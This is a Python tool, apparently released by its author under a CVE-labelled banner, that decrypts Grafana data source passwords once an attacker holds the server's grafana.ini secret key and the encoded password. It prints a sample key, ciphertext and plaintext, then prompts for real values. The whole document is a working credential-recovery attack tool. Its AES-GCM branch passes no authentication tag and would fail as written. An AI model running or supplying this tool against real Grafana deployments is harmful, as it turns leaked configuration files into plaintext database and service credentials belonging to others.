import os
import base64
import hashlib
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

salt_length = 8
aes_cfb = "aes-cfb"
aes_gcm = "aes-gcm"
encryption_algorithm_delimiter = '*'


def derive_encryption_algorithm(payload):
    if len(payload) == 0:
        raise ValueError("Unable to derive encryption algorithm")

    if payload[0] != encryption_algorithm_delimiter.encode():
        return aes_cfb, payload  # backwards compatibility

    payload = payload[1:]
    alg_delim = payload.find(encryption_algorithm_delimiter.encode())
    
    if alg_delim == -1:
        return aes_cfb, payload  # backwards compatibility

    alg_b64 = payload[:alg_delim]
    payload = payload[alg_delim + 1:]

    alg = base64.urlsafe_b64decode(alg_b64)

    return alg.decode(), payload


def decrypt_gcm(key, payload):
    nonce = payload[salt_length:salt_length + 12]  # GCM nonce is 12 bytes
    ciphertext = payload[salt_length + 12:]
    
    decryptor = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend()).decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()


def encryption_key_to_bytes(secret, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=10000,
        backend=default_backend()
    )
    return kdf.derive(secret.encode())


def decrypt_cfb(key, payload):
    if len(payload) < 16:  # AES block size is 16 bytes
        raise ValueError("Payload too short")

    iv = payload[salt_length:salt_length + 16]
    payload = payload[salt_length + 16:]

    decryptor = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend()).decryptor()
    return decryptor.update(payload) + decryptor.finalize()


def decrypt(payload, secret):
    alg, payload = derive_encryption_algorithm(payload)
    
    if len(payload) < salt_length:
        raise ValueError("Unable to compute salt")
    
    salt = payload[:salt_length]
    key = encryption_key_to_bytes(secret, salt)
    
    if alg == aes_gcm:
        return decrypt_gcm(key, payload)
    else:
        return decrypt_cfb(key, payload)


def encrypt(payload, secret):
    salt = os.urandom(salt_length)
    key = encryption_key_to_bytes(secret, salt)
    
    iv = os.urandom(16)  # Generate a random IV
    ciphertext = salt + iv
    
    encryptor = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend()).encryptor()
    ciphertext += encryptor.update(payload) + encryptor.finalize()

    return ciphertext


def main():
    # Header
    print("=" * 62)
    print("CVE-2021-43789 PASSWORD DECRYPTOR")
    print("by 0xSAZZAD")
    print("=" * 62)

    # Static output section
    print("=" * 62)
    print("[+] Grafana.ini_secretKey = SW2YcwTIb9zpOOhoPsMm")
    print("[+] EncodePassword = n6ODINHwQJeTYHK8YFsk+yakDsjgZyGsc2cqhzymJdo=")
    print("[+] PlainText = 0xSAZZAD")
    print("=" * 62)

    # Prompt user for secret key and encrypted password
    grafana_ini_secret_key = input("Enter the Grafana.ini_secretKey: ")
    data_source_password = input("Enter the encoded password: ")

    # Decrypting message
    print("Decrypting your password...")

    encrypted = base64.b64decode(data_source_password)

    try:
        pwd_bytes = decrypt(encrypted, grafana_ini_secret_key)
        print("=" * 62)
        print(f"[+] Grafana.ini_secretKey = {grafana_ini_secret_key}")
        print(f"[+] EncodedPassword = {data_source_password}")
        print(f"[+] PlainText = {pwd_bytes.decode()}")  # Attempt to decode
    except UnicodeDecodeError:
        print("=" * 62)
        print(f"[+] Grafana.ini_secretKey = {grafana_ini_secret_key}")
        print(f"[+] EncodedPassword = {data_source_password}")
        print("[!] Decryption successful, but the output is not valid UTF-8.")
        print("[!] Raw decrypted bytes: ", pwd_bytes)

    print("=" * 62)

if __name__ == "__main__":
    main()

